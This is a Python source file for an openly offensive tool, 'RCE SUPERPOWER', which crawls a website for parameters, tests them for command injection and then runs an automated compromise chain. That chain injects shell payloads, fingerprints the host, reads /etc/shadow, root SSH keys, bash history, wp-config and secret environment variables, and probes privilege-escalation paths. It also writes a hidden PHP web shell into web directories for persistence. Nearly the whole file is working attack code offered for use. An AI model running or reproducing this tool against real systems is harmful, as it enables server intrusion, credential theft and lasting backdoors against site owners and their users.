#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║  RCE SUPERPOWER — Auto Crawl · Exploit · Post-Exploitation Chain  ║
║  HACKIT Framework v2.0 — 4 Engines (Go/Rust/C++/C)                ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import os, sys, re, json, time, base64, random, string, hashlib
import subprocess, threading, queue, urllib.parse, urllib.request
import http.client, ssl, socket, argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, field

# =========================================================================
#  DATA MODELS
# =========================================================================

@dataclass
class RCEPoint:
    url: str
    parameter: str
    method: str
    payload: str
    technique: str
    confidence: float
    engine: str
    output: str = ""
    vulnerable: bool = True

@dataclass
class Endpoint:
    url: str
    method: str = "GET"
    params: List[str] = field(default_factory=list)
    body: str = ""
    form_action: str = ""
    form_method: str = "GET"
    depth: int = 0

@dataclass
class SystemInfo:
    hostname: str = ""
    kernel: str = ""
    user: str = ""
    uid: str = ""
    groups: str = ""
    os_type: str = ""
    sudo: bool = False
    writable_dirs: List[str] = field(default_factory=list)
    services: List[str] = field(default_factory=list)
    sensitive_files: Dict[str, str] = field(default_factory=dict)

@dataclass
class Target:
    system: SystemInfo = field(default_factory=SystemInfo)
    rce_points: List[RCEPoint] = field(default_factory=list)
    endpoints: List[Endpoint] = field(default_factory=list)
    harvested_data: Dict[str, str] = field(default_factory=dict)
    shells_uploaded: List[str] = field(default_factory=list)

# =========================================================================
#  COLOR & DISPLAY
# =========================================================================

R = "\033[0;31m"; G = "\033[0;32m"; Y = "\033[1;33m"
B = "\033[0;34m"; M = "\033[0;35m"; C = "\033[0;36m"; W = "\033[1;37m"; N = "\033[0m"

HEADER = f"""
{R}   ███████╗ ██████╗███████╗    ███████╗██╗  ██╗███████╗{N}
{R}   ██╔════╝██╔════╝██╔════╝    ██╔════╝╚██╗██╔╝██╔════╝{N}
{R}   █████╗  ██║     █████╗      █████╗   ╚███╔╝ █████╗  {N}
{R}   ██╔══╝  ██║     ██╔══╝      ██╔══╝   ██╔██╗ ██╔══╝  {N}
{R}   ██║     ╚██████╗███████╗    ███████╗██╔╝ ██╗███████╗{N}
{R}   ╚═╝      ╚═════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝{N}
{R}   ┌───────────────────────────────────────────────────┐{N}
{R}   │  {Y}[🔪] CHAINSAW ACTIVATED. CUTTING THROUGH FIREWALL{R}   │{N}
{R}   │  {R}[💀] RCE-SUPER.EXE — SLASH. EXECUTE. DESTROY.{R}        │{N}
{R}   │  {C}[X]  HackIT V2.1 - By AniipID{R}                    │{N}
{R}   │  {G}[+] Auto Crawl · Exploit · Post-Exploitation{R}        │{N}
{R}   │  {G}[+] 4 Engines · 150+ Payloads · 12 Techniques{R}      │{N}
{R}   └───────────────────────────────────────────────────┘{N}
"""

MODULE_DIR = os.path.dirname(os.path.abspath(__file__))
ENGINES = {
    "go": os.path.join(MODULE_DIR, "go", "bin", "rce_engine"),
    "rust": os.path.join(MODULE_DIR, "rust", "target", "release", "rce_engine"),
    "cpp": os.path.join(MODULE_DIR, "cpp", "bin", "rce_engine"),
    "c": os.path.join(MODULE_DIR, "c", "bin", "rce_engine"),
}
COMMON_PARAMS = [
    "q","id","cmd","exec","command","url","host","file","input","search",
    "c","code","lang","debug","action","process","run","system","shell",
    "page","dir","folder","path","cat","read","include","require","open",
    "doc","document","template","view","load","import","config","setting",
    "option","opt","key","token","pass","password","user","username","email",
    "data","json","ajax","api","endpoint","method","target","dest","location",
    "redirect","next","prev","return","back","url","uri","link","href","src",
    "img","image","file","upload","download","dir","folder","root","base",
]

# =========================================================================
#  HTTP CLIENT (without external deps)
# =========================================================================

def http_request(url: str, method: str = "GET", body: str = "",
                  headers: Dict = None, timeout: int = 10) -> Tuple[str, int, Dict]:
    if headers is None:
        headers = {}
    if "User-Agent" not in headers:
        headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    headers.setdefault("Accept", "text/html,application/xhtml+xml,*/*")
    headers.setdefault("Accept-Language", "en-US,en;q=0.5")

    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname or "localhost"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query

    try:
        if parsed.scheme == "https":
            ctx = ssl._create_unverified_context()
            conn = http.client.HTTPSConnection(host, port, context=ctx, timeout=timeout)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)

        conn.request(method, path, body=body if method == "POST" else None,
                     headers=headers)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", errors="replace")
        status = resp.status
        resp_headers = dict(resp.getheaders())
        conn.close()
        return data, status, resp_headers
    except Exception as e:
        return f"HTTP_ERROR:{e}", 0, {}

# =========================================================================
#  CRAWLER — Find all endpoints, forms, parameters from main URL
# =========================================================================

class RceCrawler:
    def __init__(self, base_url: str, max_depth: int = 3, max_pages: int = 50, timeout: int = 10):
        self.base_url = base_url.rstrip("/")
        parsed = urllib.parse.urlparse(base_url)
        self.base_domain = parsed.netloc
        self.base_scheme = parsed.scheme or "http"
        self.max_depth = max_depth
        self.max_pages = max_pages
        self.timeout = timeout
        self.visited = set()
        self.endpoints = []
        self.lock = threading.Lock()

    def crawl(self) -> List[Endpoint]:
        print(f"{C}[*] Crawling {self.base_url} (max depth={self.max_depth}, max pages={self.max_pages}){N}")
        pages = [self.base_url]
        for depth in range(self.max_depth):
            new_pages = []
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = {executor.submit(self._crawl_page, url, depth): url for url in pages}
                for f in as_completed(futures):
                    found = f.result()
                    new_pages.extend(found)
            pages = [p for p in new_pages if p not in self.visited][:self.max_pages - len(self.visited)]
            if not pages:
                break
            print(f"{C}[*] Crawl depth {depth+1}: found {len(pages)} new pages (total visited: {len(self.visited)}){N}")
        print(f"{G}[+] Crawl complete: {len(self.visited)} pages, {len(self.endpoints)} endpoints with parameters{N}")
        return self.endpoints

    def _crawl_page(self, url: str, depth: int):
        if url in self.visited or len(self.visited) >= self.max_pages:
            return []
        with self.lock:
            self.visited.add(url)

        found = []
        try:
            html, status, headers = http_request(url, timeout=self.timeout)
            if status != 200 or not html or html.startswith("HTTP_ERROR"):
                return []
        except:
            return []

        # Find all links
        for match in re.finditer(r'href=["\'](.*?)["\']', html, re.I):
            link = match.group(1)
            full_url = urllib.parse.urljoin(url, link)
            parsed = urllib.parse.urlparse(full_url)
            if parsed.netloc == self.base_domain and full_url not in self.visited and "#" not in full_url:
                found.append(full_url.split("?")[0] if "?" in full_url else full_url)

        # Find all forms
        for form in re.finditer(r'<form[^>]*action=["\'](.*?)["\'][^>]*method=["\'](.*?)["\'][^>]*>(.*?)</form>',
                                 html, re.I | re.S):
            action = form.group(1) or url
            method = form.group(2).upper() or "GET"
            form_html = form.group(3)
            form_url = urllib.parse.urljoin(url, action)

            params = []
            for inp in re.finditer(r'<input[^>]*name=["\'](.*?)["\'][^>]*>', form_html, re.I):
                params.append(inp.group(1))
            for sel in re.finditer(r'<select[^>]*name=["\'](.*?)["\'][^>]*>', form_html, re.I):
                params.append(sel.group(1))
            for tex in re.finditer(r'<textarea[^>]*name=["\'](.*?)["\'][^>]*>', form_html, re.I):
                params.append(tex.group(1))

            if params:
                with self.lock:
                    self.endpoints.append(Endpoint(
                        url=form_url, method=method, params=params,
                        form_action=action, form_method=method, depth=depth
                    ))
                print(f"{G}[+] Found form: {form_url} [{method}] params={params}{N}")

        # Find all links with query strings
        for match in re.finditer(r'href=["\']([^"\']*\?[^"\']+)["\']', html, re.I):
            link = match.group(1)
            full_url = urllib.parse.urljoin(url, link)
            parsed = urllib.parse.urlparse(full_url)
            if parsed.netloc == self.base_domain and full_url not in self.visited:
                qs = urllib.parse.parse_qs(parsed.query)
                if qs:
                    with self.lock:
                        self.endpoints.append(Endpoint(
                            url=full_url.split("?")[0] + "?" + parsed.query,
                            method="GET", params=list(qs.keys()), depth=depth
                        ))

        # Also extract parameters from the URL itself
        parsed_url = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed_url.query)
        if qs:
            base_path = url.split("?")[0]
            with self.lock:
                self.endpoints.append(Endpoint(
                    url=url, method="GET", params=list(qs.keys()), depth=depth
                ))

        return found

# =========================================================================
#  RCE ENGINE LAUNCHER
# =========================================================================

class EngineLauncher:
    def __init__(self, engines: List[str] = None):
        self.engines = engines or ["go", "rust", "cpp", "c"]
        self.available = {e: os.path.exists(p) for e, p in ENGINES.items() if e in self.engines}

    def test_endpoint(self, endpoint: Endpoint, cmd: str = "", timeout: int = 10,
                      blind: bool = False, oob: str = "") -> List[RCEPoint]:
        points = []
        if not endpoint.params:
            endpoint.params = ["q", "id", "cmd"]

        for eng_name in self.engines:
            if not self.available.get(eng_name):
                continue
            binary = ENGINES[eng_name]
            if not os.path.exists(binary):
                continue

            for param in endpoint.params:
                url = endpoint.url
                args = [binary, "-u", url, "-p", param, "-m", endpoint.method,
                        "--timeout", str(timeout), "--json"]
                if endpoint.body:
                    args.extend(["-d", endpoint.body])
                if cmd:
                    args.extend(["--exploit", "-c", cmd])
                else:
                    args.append("--detect")
                if blind:
                    args.append("--blind")
                if oob:
                    args.extend(["--oob", oob])
                args.append("--detect")

                try:
                    result = subprocess.run(args, capture_output=True, text=True,
                                            timeout=timeout + 15)
                    if result.stdout:
                        data = json.loads(result.stdout)
                        if isinstance(data, list):
                            for r in data:
                                if r.get("vulnerable"):
                                    points.append(RCEPoint(
                                        url=url, parameter=param,
                                        method=endpoint.method,
                                        payload=r.get("payload", ""),
                                        technique=r.get("technique", ""),
                                        confidence=r.get("confidence", 0),
                                        engine=eng_name,
                                        output=r.get("output", "")
                                    ))
                except:
                    continue
        return points

# =========================================================================
#  POST-EXPLOITATION — Auto privilege escalation & data harvesting
# =========================================================================

class PostExploiter:
    def __init__(self, rce_point: RCEPoint):
        self.rce = rce_point
        self.target = Target()
        self.target.rce_points.append(rce_point)
        self.commands_executed = []

    def _run(self, cmd: str) -> str:
        parsed = urllib.parse.urlparse(self.rce.url)
        payloads = [
            f";{cmd};", f"|{cmd}|", f"`{cmd}`", f"$({cmd})", f"&{cmd}&",
        ]
        for payload in payloads:
            try:
                qs = urllib.parse.urlencode({self.rce.parameter: payload})
                test_url = self.rce.url
                if "?" in test_url:
                    base = test_url.split("?")[0]
                    test_url = f"{base}?{qs}"
                else:
                    test_url = f"{test_url}?{qs}"

                data, status, _ = http_request(test_url, timeout=15)
                if data and not data.startswith("HTTP_ERROR") and len(data) > 5:
                    # Strip HTML
                    clean = re.sub(r'<[^>]+>', ' ', data)
                    clean = re.sub(r'\s+', ' ', clean).strip()
                    if clean and len(clean) < 10000:
                        self.commands_executed.append(cmd)
                        return clean
            except:
                continue
        return ""

    def fingerprint(self) -> SystemInfo:
        """Get comprehensive system info"""
        print(f"{C}[*] Fingerprinting target system...{N}")
        info = SystemInfo()

        cmds = {
            "hostname": "hostname",
            "kernel": "uname -a",
            "user": "whoami",
            "uid": "id",
            "os": "cat /etc/os-release 2>/dev/null | head -5 || cat /etc/issue 2>/dev/null || uname -o",
            "sudo": "sudo -n true 2>&1 && echo 'SUDO_AVAILABLE' || echo 'NO_SUDO'",
            "writable": "find / -writable -type d 2>/dev/null | head -20",
            "services": "ps aux 2>/dev/null | head -30 || ps -ef 2>/dev/null | head -30",
        }

        for key, cmd in cmds.items():
            out = self._run(cmd)
            if out and not "HTTP_ERROR" in out:
                if key == "hostname": info.hostname = out
                elif key == "kernel": info.kernel = out
                elif key == "user": info.user = out
                elif key == "uid": info.uid = out
                elif key == "os": info.os_type = out
                elif key == "sudo": info.sudo = "SUDO_AVAILABLE" in out
                elif key == "writable": info.writable_dirs = [l.strip() for l in out.split('\n') if l.strip()]
                elif key == "services": info.services = [l.strip() for l in out.split('\n') if l.strip()]

        self.target.system = info
        return info

    def harvest_passwords(self) -> Dict[str, str]:
        """Harvest sensitive data: passwords, configs, keys"""
        print(f"{Y}[*] Harvesting sensitive data...{N}")
        sensitive_files = {
            "/etc/passwd": "/etc/passwd",
            "/etc/shadow": "/etc/shadow",
            "/etc/ssh/sshd_config": "/etc/ssh/sshd_config",
            "/root/.ssh/id_rsa": "/root/.ssh/id_rsa",
            "/root/.bash_history": "/root/.bash_history",
            "/home/*/.ssh/id_rsa": "find /home -name id_rsa 2>/dev/null | head -5",
            "/var/log/auth.log": "tail -100 /var/log/auth.log 2>/dev/null",
            "/var/www/html/wp-config.php": "cat /var/www/html/wp-config.php 2>/dev/null",
            "/var/www/html/config.php": "cat /var/www/html/config.php 2>/dev/null",
            "env vars": "env 2>/dev/null | grep -i 'pass\\|secret\\|key\\|token'",
            "db configs": "find / -name '*.env' -o -name 'config*.php' -o -name 'database*' 2>/dev/null | head -10",
        }

        harvested = {}
        for name, cmd in sensitive_files.items():
            out = self._run(cmd)
            if out and len(out) > 10:
                harvested[name] = out[:2000]
                if "pass" in name.lower() or "shadow" in name.lower() or "key" in name.lower():
                    print(f"{R}[!] SENSITIVE: {name} ({len(out)} bytes){N}")
                else:
                    print(f"{G}[+] Read: {name} ({len(out)} bytes){N}")

        self.target.harvested_data = harvested
        return harvested

    def auto_escalate(self) -> bool:
        """Try privilege escalation automatically"""
        print(f"{Y}[*] Attempting privilege escalation...{N}")

        if self.target.system.sudo:
            print(f"{G}[+] User has sudo access!{N}")
            root_test = self._run("sudo id")
            if "root" in root_test.lower():
                print(f"{R}[!] GOT ROOT VIA SUDO! uid=0(root){N}")
                self.target.system.user = "root"
                return True

        # Try common PE vectors
        pe_checks = [
            ("SUID binaries", "find / -perm -4000 2>/dev/null | head -20"),
            ("Cron jobs", "cat /etc/crontab 2>/dev/null | head -30"),
            ("Kernel exploit", "uname -r"),
            ("Docker group", "groups | grep docker"),
            ("LXD group", "groups | grep lxd"),
            ("Writable /etc", "ls -la /etc/passwd 2>/dev/null; ls -la /etc/shadow 2>/dev/null"),
        ]

        for name, cmd in pe_checks:
            out = self._run(cmd)
            if out:
                print(f"{C}[*] {name}: {out[:150]}{N}")

        # Try kernel exploit suggestion
        kernel = self.target.system.kernel
        if kernel:
            print(f"{Y}[*] Kernel: {kernel[:80]} — checking known exploits...{N}")

        return False

    def upload_backdoor(self) -> Optional[str]:
        """Try to upload a web shell for persistence"""
        print(f"{C}[*] Attempting backdoor upload...{N}")

        # Find writable web directories
        web_paths = [
            "/var/www/html/", "/var/www/", "/var/www/tmp/",
            "/var/www/html/uploads/", "/var/www/html/images/",
            "/tmp/", "/dev/shm/",
        ]

        shell_name = f".hackit_{random.randint(1000,9999)}.php"
        shell_content = f'<?php system($_GET["c"]); ?>'

        for path in web_paths:
            cmd = f'echo \'{shell_content}\' > {path}{shell_name} 2>/dev/null && echo "UPLOADED" || echo "FAILED"'
            out = self._run(cmd)
            if out and "UPLOADED" in out:
                web_url = f"{self.rce.url.split('/')[0]}//{urllib.parse.urlparse(self.rce.url).netloc}/{shell_name}"
                print(f"{R}[!] BACKDOOR UPLOADED: {web_url}?c=id{N}")
                self.target.shells_uploaded.append(web_url)
                return web_url
        return None

    def full_chain(self) -> Target:
        """Execute complete post-exploitation chain"""
        print(f"\n{M}{'='*60}{N}")
        print(f"{M}  POST-EXPLOITATION CHAIN STARTED{N}")
        print(f"{M}{'='*60}{N}")

        # 1. Fingerprint
        self.fingerprint()
        print(f"{G}[+] Hostname: {self.target.system.hostname}{N}")
        print(f"{G}[+] User: {self.target.system.user} ({self.target.system.uid[:80]}){N}")
        print(f"{G}[+] OS: {self.target.system.os_type[:80]}{N}")
        print(f"{G}[+] Sudo: {'YES' if self.target.system.sudo else 'NO'}{N}")

        # 2. Harvest
        self.harvest_passwords()

        # 3. Escalate
        self.auto_escalate()

        # 4. Backdoor
        shell_url = self.upload_backdoor()

        # 5. Exfiltrate data
        print(f"{C}[*] Exfiltration summary:{N}")
        if self.target.harvested_data:
            for name, data in self.target.harvested_data.items():
                sensitive = any(k in name.lower() for k in ["pass", "shadow", "key", "secret", "token"])
                tag = f"{R}SENSITIVE{N}" if sensitive else f"{G}ok{N}"
                print(f"  [{tag}] {name}: {len(data)} bytes")

        print(f"\n{G}{'='*60}{N}")
        print(f"{G}  POST-EXPLOITATION COMPLETE{N}")
        print(f"{R}  ROOT ACCESS: {'YES' if self.target.system.user == 'root' else 'NO — attempt manual escalation'}{N}")
        if shell_url:
            print(f"{R}  WEBSHELL: {shell_url}?c=id{N}")
        print(f"{G}{'='*60}{N}")

        return self.target


# =========================================================================
#  MAIN ORCHESTRATOR
# =========================================================================

class RceSuperPower:
    def __init__(self, base_url: str, engines: List[str] = None,
                 max_depth: int = 2, max_pages: int = 30, timeout: int = 10,
                 blind: bool = False, oob: str = "", auto_post: bool = True,
                 verbose: bool = False):
        self.base_url = base_url.rstrip("/")
        self.engines = engines or ["go", "rust", "cpp", "c"]
        self.max_depth = max_depth
        self.max_pages = max_pages
        self.timeout = timeout
        self.blind = blind
        self.oob = oob
        self.auto_post = auto_post
        self.verbose = verbose
        self.target = Target()

    def run(self):
        print(HEADER)
        print(f"{W}[+] Target: {self.base_url}{N}")
        print(f"{W}[+] Engines: {', '.join(self.engines)}{N}")
        print(f"{W}[+] Auto post-exploitation: {'ON' if self.auto_post else 'OFF'}{N}")
        print()

        # PHASE 1: CRAWL
        print(f"{M}{'='*60}{N}")
        print(f"{M}  PHASE 1: CRAWLING — Finding all attack surfaces{N}")
        print(f"{M}{'='*60}{N}")

        crawler = RceCrawler(self.base_url, max_depth=self.max_depth,
                             max_pages=self.max_pages, timeout=self.timeout)
        endpoints = crawler.crawl()
        self.target.endpoints = endpoints

        if not endpoints:
            print(f"{Y}[!] No endpoints found from crawling. Using main URL only.{N}")
            endpoints = [Endpoint(url=self.base_url, method="GET")]

        # PHASE 2: DETECT & EXPLOIT
        print(f"\n{M}{'='*60}{N}")
        print(f"{M}  PHASE 2: RCE DETECTION — Testing {len(endpoints)} endpoints{N}")
        print(f"{M}{'='*60}{N}")

        launcher = EngineLauncher(self.engines)
        all_points = []
        total_tested = 0

        for ep in endpoints:
            if self.verbose:
                print(f"{C}[*] Testing: {ep.url} [{ep.method}] params={ep.params}{N}")

            points = launcher.test_endpoint(ep, timeout=self.timeout,
                                           blind=self.blind, oob=self.oob)
            total_tested += len(ep.params) if ep.params else 1

            if points:
                for p in points:
                    print(f"{R}[!] RCE FOUND!{N} {W}{p.url}{N} | param={Y}{p.parameter}{N} | "
                          f"engine={C}{p.engine}{N} | confidence={G}{p.confidence*100:.0f}%{N}")
                    all_points.append(p)
            else:
                if self.verbose:
                    print(f"  {Y}[-] No RCE on {ep.url} [{ep.method}] params={ep.params}{N}")

        self.target.rce_points = all_points

        print(f"\n{G}[+] Scan complete: {total_tested} injections tested, "
              f"{len(all_points)} RCE points found{N}")

        # PHASE 3: POST-EXPLOITATION
        if all_points and self.auto_post:
            print(f"\n{M}{'='*60}{N}")
            print(f"{M}  PHASE 3: POST-EXPLOITATION — Full compromise chain{N}")
            print(f"{M}{'='*60}{N}")

            # Use the highest confidence point for post-ex
            best_point = max(all_points, key=lambda p: p.confidence)
            print(f"{G}[+] Using best RCE point: {best_point.url} param={best_point.parameter} "
                  f"engine={best_point.engine}{N}")

            exploiter = PostExploiter(best_point)
            self.target = exploiter.full_chain()

        else:
            print(f"\n{Y}[!] No RCE points found. Target may be secure.{N}")

        # FINAL REPORT
        self._print_report()

    def _print_report(self):
        print(f"\n{M}{'='*60}{N}")
        print(f"{M}  FINAL REPORT — RCE SUPERPOWER{N}")
        print(f"{M}{'='*60}{N}")

        print(f"\n{W}[ Target ]{N}")
        print(f"  URL: {self.base_url}")
        print(f"  Endpoints crawled: {len(self.target.endpoints)}")
        print(f"  RCE points: {len(self.target.rce_points)}")

        if self.target.rce_points:
            print(f"\n{W}[ Vulnerabilities ]{N}")
            for i, p in enumerate(self.target.rce_points, 1):
                print(f"  {R}[!] #{i}{N} {p.url} | param={p.parameter} | "
                      f"tech={p.technique} | conf={p.confidence*100:.0f}% | engine={p.engine}")

        if self.target.system.hostname:
            print(f"\n{W}[ System Info ]{N}")
            print(f"  Hostname: {self.target.system.hostname}")
            print(f"  User: {self.target.system.user}")
            print(f"  OS: {self.target.system.os_type[:100]}")
            print(f"  Sudo: {'YES' if self.target.system.sudo else 'NO'}")
            print(f"  Root: {'YES' if self.target.system.user == 'root' else 'NO'}")

        if self.target.harvested_data:
            print(f"\n{W}[ Harvested Data ]{N}")
            for name, data in self.target.harvested_data.items():
                tag = f"{R}SENSITIVE{N}" if any(k in name.lower()
                        for k in ["pass", "shadow", "key", "secret"]) else f"{G}info{N}"
                print(f"  [{tag}] {name} ({len(data)} bytes)")

        if self.target.shells_uploaded:
            print(f"\n{W}[ Backdoors ]{N}")
            for s in self.target.shells_uploaded:
                print(f"  {R}[!] Webshell: {s}?c=id{N}")

        vuln_count = len(self.target.rce_points)
        if vuln_count > 0:
            print(f"\n{R}{'='*60}{N}")
            print(f"{R}  ⚠  TARGET COMPROMISED — {vuln_count} RCE point(s) found{N}")
            if self.target.system.user == "root":
                print(f"{R}  ★ ROOT ACCESS ACHIEVED — Full control established ★{N}")
            print(f"{R}{'='*60}{N}")
        else:
            print(f"\n{G}✓ Target appears secure{N}")


# =========================================================================
#  STANDALONE CLI
# =========================================================================

def main():
    parser = argparse.ArgumentParser(
        description="RCE SUPERPOWER — Auto Crawl · Exploit · Post-Exploitation Chain",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Contoh:
  %(prog)s -u http://target.com
  %(prog)s -u http://target.com/page.php?cmd=test --blind
  %(prog)s -u http://target.com --oob http://collab.oastify.com --engines go,rust
  %(prog)s -u http://target.com --depth 3 --pages 100 --no-post
  %(prog)s -u http://target.com --verbose
        """
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL (main page)")
    parser.add_argument("-e", "--engines", default="go,rust,cpp,c",
                        help="Engines: go,rust,cpp,c (default: all)")
    parser.add_argument("--depth", type=int, default=2, help="Crawl depth (default: 2)")
    parser.add_argument("--pages", type=int, default=30, help="Max pages to crawl (default: 30)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout (default: 10s)")
    parser.add_argument("--blind", action="store_true", help="Blind/time-based only")
    parser.add_argument("--oob", help="OOB callback URL (e.g., http://collab.com)")
    parser.add_argument("--no-post", action="store_true", help="Skip post-exploitation")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    sp = RceSuperPower(
        base_url=args.url,
        engines=args.engines.split(","),
        max_depth=args.depth,
        max_pages=args.pages,
        timeout=args.timeout,
        blind=args.blind,
        oob=args.oob or "",
        auto_post=not args.no_post,
        verbose=args.verbose,
    )
    sp.run()


if __name__ == "__main__":
    main()
